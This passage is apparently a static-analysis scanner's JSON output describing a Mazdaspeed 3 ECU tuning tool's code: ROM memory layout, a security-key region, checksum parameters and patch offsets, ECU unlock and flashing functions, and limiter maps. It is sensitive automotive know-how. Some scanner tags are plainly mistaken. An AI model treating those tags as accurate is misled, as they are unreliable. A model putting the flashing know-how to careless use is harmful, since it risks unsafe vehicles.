{"file_path": "versa20.md", "lines_read": 222, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa3.py", "lines_read": 413, "features_found": [{"type": "function", "name": "__init__", "line": 63}, {"type": "function", "name": "read_complete_rom", "line": 88}, {"type": "function", "name": "read_memory_range", "line": 129}, {"type": "function", "name": "write_memory_range", "line": 177}, {"type": "function", "name": "write_complete_rom", "line": 225}, {"type": "function", "name": "verify_rom_integrity", "line": 269}, {"type": "function", "name": "verify_checksums", "line": 315}, {"type": "function", "name": "_calculate_sum16", "line": 343}, {"type": "function", "name": "patch_checksums", "line": 352}, {"type": "function", "name": "read_ecu_info", "line": 379}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": ".ecu_communication", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "crcmod", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}], "components_found": [{"type": "class", "name": "ROMDefinition", "line": 17}, {"type": "class", "name": "ROMOperations", "line": 25}], "algorithms": [{"type": "algorithm_function", "line": 343, "content": "def _calculate_sum16(self, data: bytes) -> int:"}], "protocols": [{"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "'boot_sector': ROMDefinition(0x000000, 0x010000, 'Bootloader and security'),"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "'calibration_a': ROMDefinition(0x010000, 0x080000, 'Primary calibration tables'),"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "'calibration_b': ROMDefinition(0x090000, 0x080000, 'Secondary calibration backup'),"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "'operating_system': ROMDefinition(0x110000, 0x040000, 'ECU operating system'),"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "'fault_memory': ROMDefinition(0x150000, 0x020000, 'DTC and freeze frame storage'),"}, {"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "'adaptation_data': ROMDefinition(0x170000, 0x020000, 'Adaptive learning data'),"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "'vehicle_data': ROMDefinition(0x190000, 0x001000, 'VIN and vehicle information'),"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "'security_data': ROMDefinition(0x191000, 0x001000, 'Security keys and access'),"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "'end_sector': ROMDefinition(0x1F0000, 0x010000, 'Checksums and validation data')"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "'polynomial': 0x04C11DB7,"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "'init_value': 0xFFFFFFFF,"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "'xor_out': 0xFFFFFFFF,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "'polynomial': 0x1021,"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "'init_value': 0xFFFF,"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "'xor_out': 0x0000,"}, {"type": "protocol", "line": 207, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x3D, 0x00, address_bytes + data_bytes)"}, {"type": "protocol", "line": 328, "protocol": "0x[0-9A-Fa-f]+", "content": "calibration_data = rom_data[0x010000:0x090000]"}, {"type": "protocol", "line": 332, "protocol": "0x[0-9A-Fa-f]+", "content": "stored_crc32 = struct.unpack('>I', rom_data[0x1FFFF0:0x1FFFF4])[0]"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "boot_data = rom_data[0x000000:0x00FFFC]"}, {"type": "protocol", "line": 338, "protocol": "0x[0-9A-Fa-f]+", "content": "stored_sum16 = struct.unpack('>H', rom_data[0x00FFFC:0x00FFFE])[0]"}, {"type": "protocol", "line": 349, "protocol": "0x[0-9A-Fa-f]+", "content": "total = (total + value) & 0xFFFF"}, {"type": "protocol", "line": 367, "protocol": "0x[0-9A-Fa-f]+", "content": "calibration_data = rom_data[0x010000:0x090000]"}, {"type": "protocol", "line": 369, "protocol": "0x[0-9A-Fa-f]+", "content": "rom_data[0x1FFFF0:0x1FFFF4] = struct.pack('>I', new_crc32)"}, {"type": "protocol", "line": 372, "protocol": "0x[0-9A-Fa-f]+", "content": "boot_data = rom_data[0x000000:0x00FFFC]"}, {"type": "protocol", "line": 374, "protocol": "0x[0-9A-Fa-f]+", "content": "rom_data[0x00FFFC:0x00FFFE] = struct.pack('>H', new_sum16)"}, {"type": "protocol", "line": 393, "protocol": "0x[0-9A-Fa-f]+", "content": "part_response = self.ecu.send_request(0x22, 0xF187)"}, {"type": "protocol", "line": 400, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_response = self.ecu.send_request(0x22, 0xF18A)"}, {"type": "protocol", "line": 407, "protocol": "0x[0-9A-Fa-f]+", "content": "sw_response = self.ecu.send_request(0x22, 0xF188)"}], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ECU", "content": "ROM Operations Module - Handles ECU ROM reading, writing, and verification"}, {"type": "hardware", "line": 13, "hardware": "ECU", "content": "from .ecu_communication import ECUCommunicator, ECUResponse"}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "checksum calculation, and verification for Mazdaspeed 3 ECU"}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "'boot_sector': ROMDefinition(0x000000, 0x010000, 'Bootloader and security'),"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "'operating_system': ROMDefinition(0x110000, 0x040000, 'ECU operating system'),"}, {"type": "hardware", "line": 39, "hardware": "vehicle", "content": "'vehicle_data': ROMDefinition(0x190000, 0x001000, 'VIN and vehicle information'),"}, {"type": "hardware", "line": 40, "hardware": "ECU", "content": "'security_data': ROMDefinition(0x191000, 0x001000, 'Security keys and access'),"}, {"type": "hardware", "line": 63, "hardware": "ECU", "content": "def __init__(self, ecu_communicator: ECUCommunicator):"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "ecu_communicator: ECUCommunicator instance for communication"}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "self.ecu = ecu_communicator"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "Read complete ECU ROM to memory"}, {"type": "hardware", "line": 132, "hardware": "ECU", "content": "Read memory range from ECU"}, {"type": "hardware", "line": 152, "hardware": "ECU", "content": "response = self.ecu.read_memory(current_address, current_chunk_size)"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "Write data to ECU memory"}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "response = self.ecu.send_request(0x3D, 0x00, address_bytes + data_bytes)"}, {"type": "hardware", "line": 228, "hardware": "ECU", "content": "Write complete ROM to ECU"}, {"type": "hardware", "line": 379, "hardware": "ECU", "content": "def read_ecu_info(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 381, "hardware": "ECU", "content": "Read ECU information including part numbers and calibration IDs"}, {"type": "hardware", "line": 384, "hardware": "ECU", "content": "Dict containing ECU information"}, {"type": "hardware", "line": 389, "hardware": "ECU", "content": "vin = self.ecu.read_vin()"}, {"type": "hardware", "line": 393, "hardware": "ECU", "content": "part_response = self.ecu.send_request(0x22, 0xF187)"}, {"type": "hardware", "line": 395, "hardware": "ECU", "content": "info['ecu_part_number'] = part_response.data[3:19].decode('ascii', errors='ignore').strip()"}, {"type": "hardware", "line": 397, "hardware": "ECU", "content": "info['ecu_part_number'] = 'Unknown'"}, {"type": "hardware", "line": 400, "hardware": "ECU", "content": "cal_response = self.ecu.send_request(0x22, 0xF18A)"}, {"type": "hardware", "line": 407, "hardware": "ECU", "content": "sw_response = self.ecu.send_request(0x22, 0xF188)"}], "security_logic": [{"type": "security_pattern", "line": 9, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 22, "pattern": "algorithm", "content": "checksum_algorithm: Optional[str] = None"}, {"type": "security_pattern", "line": 40, "pattern": "key", "content": "'security_data': ROMDefinition(0x191000, 0x001000, 'Security keys and access'),"}, {"type": "security_pattern", "line": 45, "pattern": "algorithm", "content": "CHECKSUM_ALGORITHMS = {"}, {"type": "security_pattern", "line": 59, "pattern": "algorithm", "content": "'algorithm': 'sum16'"}, {"type": "security_pattern", "line": 75, "pattern": "algorithm", "content": "self.CHECKSUM_ALGORITHMS['CRC32']['polynomial'],"}, {"type": "security_pattern", "line": 76, "pattern": "algorithm", "content": "initCrc=self.CHECKSUM_ALGORITHMS['CRC32']['init_value'],"}, {"type": "security_pattern", "line": 77, "pattern": "algorithm", "content": "xorOut=self.CHECKSUM_ALGORITHMS['CRC32']['xor_out'],"}, {"type": "security_pattern", "line": 78, "pattern": "algorithm", "content": "rev=self.CHECKSUM_ALGORITHMS['CRC32']['reflected']"}, {"type": "security_pattern", "line": 82, "pattern": "algorithm", "content": "self.CHECKSUM_ALGORITHMS['CRC16_CCITT']['polynomial'],"}, {"type": "security_pattern", "line": 83, "pattern": "algorithm", "content": "initCrc=self.CHECKSUM_ALGORITHMS['CRC16_CCITT']['init_value'],"}, {"type": "security_pattern", "line": 84, "pattern": "algorithm", "content": "xorOut=self.CHECKSUM_ALGORITHMS['CRC16_CCITT']['xor_out'],"}, {"type": "security_pattern", "line": 85, "pattern": "algorithm", "content": "rev=self.CHECKSUM_ALGORITHMS['CRC16_CCITT']['reflected']"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa4.py", "lines_read": 467, "features_found": [{"type": "function", "name": "__init__", "line": 35}, {"type": "function", "name": "_load_map_definitions", "line": 40}, {"type": "function", "name": "_get_ignition_maps", "line": 61}, {"type": "function", "name": "_get_fuel_maps", "line": 137}, {"type": "function", "name": "_get_boost_maps", "line": 200}, {"type": "function", "name": "_get_vvt_maps", "line": 262}, {"type": "function", "name": "_get_torque_maps", "line": 310}, {"type": "function", "name": "_get_limiter_maps", "line": 343}, {"type": "function", "name": "_get_correction_maps", "line": 384}, {"type": "function", "name": "_organize_categories", "line": 415}, {"type": "function", "name": "get_map", "line": 424}, {"type": "function", "name": "get_maps_by_category", "line": 428}, {"type": "function", "name": "get_all_categories", "line": 433}, {"type": "function", "name": "validate_map_value", "line": 437}, {"type": "function", "name": "export_definitions", "line": 444}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}], "components_found": [{"type": "class", "name": "MapDefinition", "line": 14}, {"type": "class", "name": "MapDefinitionManager", "line": 29}], "algorithms": [], "protocols": [{"type": "protocol", "line": 69, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x012000,"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0400,"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x012400,"}, {"type": "protocol", "line": 84, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0400,"}, {"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x012800,"}, {"type": "protocol", "line": 98, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0400,"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x012E00,"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0100,"}, {"type": "protocol", "line": 124, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x012F00,"}, {"type": "protocol", "line": 125, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0100,"}, {"type": "protocol", "line": 145, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x013000,"}, {"type": "protocol", "line": 146, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0400,"}, {"type": "protocol", "line": 159, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x013400,"}, {"type": "protocol", "line": 160, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0200,"}, {"type": "protocol", "line": 173, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x013600,"}, {"type": "protocol", "line": 174, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0200,"}, {"type": "protocol", "line": 187, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x013800,"}, {"type": "protocol", "line": 188, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0100,"}, {"type": "protocol", "line": 208, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x014000,"}, {"type": "protocol", "line": 209, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0400,"}, {"type": "protocol", "line": 222, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x014400,"}, {"type": "protocol", "line": 223, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0400,"}, {"type": "protocol", "line": 236, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x014800,"}, {"type": "protocol", "line": 237, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0200,"}, {"type": "protocol", "line": 250, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x014A00,"}, {"type": "protocol", "line": 251, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0010,"}, {"type": "protocol", "line": 270, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x015000,"}, {"type": "protocol", "line": 271, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0400,"}, {"type": "protocol", "line": 284, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x015400,"}, {"type": "protocol", "line": 285, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0400,"}, {"type": "protocol", "line": 298, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x015800,"}, {"type": "protocol", "line": 299, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0010,"}, {"type": "protocol", "line": 315, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x016000,"}, {"type": "protocol", "line": 316, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0200,"}, {"type": "protocol", "line": 329, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x016200,"}, {"type": "protocol", "line": 330, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0200,"}, {"type": "protocol", "line": 348, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x017000,"}, {"type": "protocol", "line": 349, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0010,"}, {"type": "protocol", "line": 360, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x017010,"}, {"type": "protocol", "line": 361, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0010,"}, {"type": "protocol", "line": 372, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x017100,"}, {"type": "protocol", "line": 373, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0010,"}, {"type": "protocol", "line": 389, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x018000,"}, {"type": "protocol", "line": 390, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0100,"}, {"type": "protocol", "line": 402, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x018100,"}, {"type": "protocol", "line": 403, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0100,"}], "hardware_assumptions": [{"type": "hardware", "line": 344, "hardware": "vehicle", "content": "\"\"\"Engine and vehicle limiters\"\"\""}, {"type": "hardware", "line": 375, "hardware": "vehicle", "content": "description='Vehicle speed limit',"}], "security_logic": [{"type": "security_pattern", "line": 435, "pattern": "key", "content": "return list(self.categories.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa5.py", "lines_read": 447, "features_found": [{"type": "function", "name": "__init__", "line": 27}, {"type": "function", "name": "load_map_from_rom", "line": 39}, {"type": "function", "name": "_bytes_to_array", "line": 83}, {"type": "function", "name": "_convert_16x16_bytes", "line": 96}, {"type": "function", "name": "_convert_8x8_bytes", "line": 107}, {"type": "function", "name": "_convert_1d_bytes", "line": 118}, {"type": "function", "name": "_convert_single_bytes", "line": 129}, {"type": "function", "name": "modify_map_value", "line": 137}, {"type": "function", "name": "apply_global_adjustment", "line": 179}, {"type": "function", "name": "interpolate_map", "line": 217}, {"type": "function", "name": "generate_patch_rom", "line": 269}, {"type": "function", "name": "_has_map_changed", "line": 298}, {"type": "function", "name": "_array_to_bytes", "line": 303}, {"type": "function", "name": "_convert_16x16_array", "line": 319}, {"type": "function", "name": "_convert_8x8_array", "line": 331}, {"type": "function", "name": "_convert_1d_array", "line": 343}, {"type": "function", "name": "_convert_single_array", "line": 354}, {"type": "function", "name": "create_performance_tune", "line": 361}, {"type": "function", "name": "_apply_stage1_tune", "line": 398}, {"type": "function", "name": "_apply_stage2_tune", "line": 410}, {"type": "function", "name": "_apply_stage3_tune", "line": 427}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": ".map_definitions", "line": null}, {"type": "import", "module": "..core.rom_operations", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "scipy.interpolate", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "MapDefinition,", "line": null}, {"type": "import", "module": "ROMOperations", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}, {"type": "import", "module": "interp2d", "line": null}, {"type": "import", "module": "scipy", "line": null}], "components_found": [{"type": "class", "name": "MapData", "line": 15}, {"type": "class", "name": "MapEditor", "line": 21}], "algorithms": [], "protocols": [{"type": "protocol", "line": 326, "protocol": "0x[0-9A-Fa-f]+", "content": "raw_value = max(0, min(0xFFFF, raw_value))  # Clamp to 16-bit range"}, {"type": "protocol", "line": 338, "protocol": "0x[0-9A-Fa-f]+", "content": "raw_value = max(0, min(0xFFFF, raw_value))"}, {"type": "protocol", "line": 349, "protocol": "0x[0-9A-Fa-f]+", "content": "raw_value = max(0, min(0xFFFF, raw_value))"}, {"type": "protocol", "line": 358, "protocol": "0x[0-9A-Fa-f]+", "content": "raw_value = max(0, min(0xFFFF, raw_value))"}], "hardware_assumptions": [], "security_logic": [{"type": "security_pattern", "line": 375, "pattern": "key", "content": "key_maps = ["}, {"type": "security_pattern", "line": 380, "pattern": "key", "content": "for map_name in key_maps:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa6.py", "lines_read": 306, "features_found": [{"type": "function", "name": "__init__", "line": 33}, {"type": "function", "name": "start_monitoring", "line": 69}, {"type": "function", "name": "stop_monitoring", "line": 92}, {"type": "function", "name": "_monitoring_loop", "line": 102}, {"type": "function", "name": "_read_engine_parameters", "line": 122}, {"type": "function", "name": "_get_pid_name", "line": 133}, {"type": "function", "name": "_perform_adaptive_adjustments", "line": 146}, {"type": "function", "name": "_adjust_for_knock", "line": 162}, {"type": "function", "name": "_adjust_boost_control", "line": 190}, {"type": "function", "name": "_adjust_fueling", "line": 203}, {"type": "function", "name": "_rpm_to_index", "line": 223}, {"type": "function", "name": "_load_to_index", "line": 234}, {"type": "function", "name": "_log_monitoring_data", "line": 245}, {"type": "function", "name": "enable_adaptive_tuning", "line": 256}, {"type": "function", "name": "disable_adaptive_tuning", "line": 261}, {"type": "function", "name": "get_tuning_history", "line": 266}, {"type": "function", "name": "clear_tuning_history", "line": 270}, {"type": "function", "name": "generate_tuning_report", "line": 275}, {"type": "function", "name": "_get_monitoring_duration", "line": 287}, {"type": "function", "name": "_count_knock_events", "line": 296}, {"type": "function", "name": "_count_boost_events", "line": 300}, {"type": "function", "name": "_get_recent_adjustments", "line": 304}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "..core.ecu_communication", "line": null}, {"type": "import", "module": ".map_definitions", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "ECUCommunicator", "line": null}, {"type": "import", "module": "MapDefinitionManager", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}], "components_found": [{"type": "class", "name": "TuningAdjustment", "line": 17}, {"type": "class", "name": "RealTimeTuner", "line": 27}], "algorithms": [], "protocols": [{"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0C,  # RPM"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0D,  # Vehicle Speed"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11,  # Throttle Position"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05,  # Coolant Temp"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0F,  # Intake Air Temp"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "0x223365,  # Boost Pressure"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "0x223456,  # Knock Correction"}, {"type": "protocol", "line": 134, "protocol": "PID", "content": "\"\"\"Get human-readable name for PID\"\"\""}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0C: 'rpm',"}, {"type": "protocol", "line": 137, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0D: 'speed',"}, {"type": "protocol", "line": 138, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: 'throttle',"}, {"type": "protocol", "line": 139, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05: 'coolant_temp',"}, {"type": "protocol", "line": 140, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0F: 'intake_temp',"}, {"type": "protocol", "line": 141, "protocol": "0x[0-9A-Fa-f]+", "content": "0x223365: 'boost',"}, {"type": "protocol", "line": 142, "protocol": "0x[0-9A-Fa-f]+", "content": "0x223456: 'knock_correction'"}], "hardware_assumptions": [{"type": "hardware", "line": 12, "hardware": "ECU", "content": "from ..core.ecu_communication import ECUCommunicator"}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "def __init__(self, ecu_communicator: ECUCommunicator):"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "ecu_communicator: ECUCommunicator instance for live data"}, {"type": "hardware", "line": 40, "hardware": "ECU", "content": "self.ecu = ecu_communicator"}, {"type": "hardware", "line": 52, "hardware": "vehicle", "content": "0x0D,  # Vehicle Speed"}, {"type": "hardware", "line": 123, "hardware": "ECU", "content": "\"\"\"Read current engine parameters from ECU\"\"\""}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "value = self.ecu.read_live_data(pid)"}, {"type": "hardware", "line": 169, "hardware": "ABS", "content": "timing_reduction = abs(knock_amount) * 0.5"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa7.py", "lines_read": 719, "features_found": [{"type": "function", "name": "main", "line": 713}, {"type": "function", "name": "__init__", "line": 26}, {"type": "function", "name": "_setup_gui", "line": 52}, {"type": "function", "name": "_create_connection_tab", "line": 76}, {"type": "function", "name": "_create_dashboard_tab", "line": 115}, {"type": "function", "name": "_create_tuning_tab", "line": 179}, {"type": "function", "name": "_create_diagnostic_tab", "line": 233}, {"type": "function", "name": "_create_flashing_tab", "line": 266}, {"type": "function", "name": "_create_settings_tab", "line": 302}, {"type": "function", "name": "_create_status_bar", "line": 337}, {"type": "function", "name": "_start_background_tasks", "line": 345}, {"type": "function", "name": "_on_tab_changed", "line": 354}, {"type": "function", "name": "_connect_ecu", "line": 360}, {"type": "function", "name": "_on_connect_success", "line": 374}, {"type": "function", "name": "_on_connect_failure", "line": 382}, {"type": "function", "name": "_disconnect_ecu", "line": 386}, {"type": "function", "name": "_update_vehicle_info", "line": 393}, {"type": "function", "name": "_unlock_ecu", "line": 407}, {"type": "function", "name": "_enter_programming_mode", "line": 421}, {"type": "function", "name": "_on_category_selected", "line": 433}, {"type": "function", "name": "_on_map_selected", "line": 445}, {"type": "function", "name": "_load_selected_map", "line": 450}, {"type": "function", "name": "_display_map_data", "line": 468}, {"type": "function", "name": "_apply_map_changes", "line": 497}, {"type": "function", "name": "_reset_map", "line": 502}, {"type": "function", "name": "_save_map", "line": 506}, {"type": "function", "name": "_apply_preset_tune", "line": 515}, {"type": "function", "name": "_read_dtcs", "line": 528}, {"type": "function", "name": "_clear_dtcs", "line": 546}, {"type": "function", "name": "_start_live_monitoring", "line": 559}, {"type": "function", "name": "_stop_live_monitoring", "line": 564}, {"type": "function", "name": "_read_rom", "line": 569}, {"type": "function", "name": "_on_rom_read_complete", "line": 588}, {"type": "function", "name": "_save_rom", "line": 600}, {"type": "function", "name": "_load_rom_file", "line": 620}, {"type": "function", "name": "_verify_rom", "line": 635}, {"type": "function", "name": "_write_rom", "line": 649}, {"type": "function", "name": "_on_rom_write_complete", "line": 676}, {"type": "function", "name": "_backup_rom", "line": 687}, {"type": "function", "name": "_restore_backup", "line": 691}, {"type": "function", "name": "_start_logging", "line": 695}, {"type": "function", "name": "_stop_logging", "line": 700}, {"type": "function", "name": "_save_settings", "line": 705}, {"type": "function", "name": "run", "line": 709}, {"type": "function", "name": "connect_thread", "line": 362}, {"type": "function", "name": "read_thread", "line": 575}, {"type": "function", "name": "write_thread", "line": 663}, {"type": "function", "name": "progress_callback", "line": 578}, {"type": "function", "name": "progress_callback", "line": 666}, {"type": "import", "module": "tkinter", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "..core.ecu_communication", "line": null}, {"type": "import", "module": "..core.security_access", "line": null}, {"type": "import", "module": "..core.rom_operations", "line": null}, {"type": "import", "module": "..tuning.map_editor", "line": null}, {"type": "import", "module": "..tuning.realtime_tuning", "line": null}, {"type": "import", "module": "..vehicle.mazdaspeed3_2011", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "tkinter", "line": null}, {"type": "import", "module": "ttk,", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "ECUCommunicator", "line": null}, {"type": "import", "module": "SecurityManager", "line": null}, {"type": "import", "module": "ROMOperations", "line": null}, {"type": "import", "module": "MapEditor", "line": null}, {"type": "import", "module": "RealTimeTuner", "line": null}, {"type": "import", "module": "Mazdaspeed32011", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}], "components_found": [{"type": "class", "name": "VersaTunerGUI", "line": 20}], "algorithms": [], "protocols": [{"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "self.root.geometry(\"1200x800\")"}, {"type": "protocol", "line": 85, "protocol": "CAN", "content": "ttk.Label(conn_control_frame, text=\"CAN Interface:\").grid(row=0, column=0, sticky=tk.W)"}], "hardware_assumptions": [{"type": "hardware", "line": 12, "hardware": "ECU", "content": "from ..core.ecu_communication import ECUCommunicator"}, {"type": "hardware", "line": 13, "hardware": "ECU", "content": "from ..core.security_access import SecurityManager"}, {"type": "hardware", "line": 17, "hardware": "vehicle", "content": "from ..vehicle.mazdaspeed3_2011 import Mazdaspeed32011"}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "self.ecu_comm = ECUCommunicator()"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "self.security_mgr = SecurityManager(self.ecu_comm)"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "self.rom_ops = ROMOperations(self.ecu_comm)"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "self.realtime_tuner = RealTimeTuner(self.ecu_comm)"}, {"type": "hardware", "line": 39, "hardware": "vehicle", "content": "self.vehicle = Mazdaspeed32011()"}, {"type": "hardware", "line": 77, "hardware": "vehicle", "content": "\"\"\"Create connection and vehicle info tab\"\"\""}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "conn_control_frame = ttk.LabelFrame(connection_frame, text=\"ECU Connection\", padding=10)"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "command=self._connect_ecu).grid(row=0, column=2, padx=5)"}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "command=self._disconnect_ecu).grid(row=0, column=3, padx=5)"}, {"type": "hardware", "line": 95, "hardware": "vehicle", "content": "vehicle_frame = ttk.LabelFrame(connection_frame, text=\"Vehicle Information\", padding=10)"}, {"type": "hardware", "line": 96, "hardware": "vehicle", "content": "vehicle_frame.pack(fill=tk.X, padx=5, pady=5)"}, {"type": "hardware", "line": 98, "hardware": "vehicle", "content": "self.vehicle_info_text = tk.Text(vehicle_frame, height=8, width=80)"}, {"type": "hardware", "line": 99, "hardware": "vehicle", "content": "self.vehicle_info_text.pack(fill=tk.X, padx=5, pady=5)"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "security_frame = ttk.LabelFrame(connection_frame, 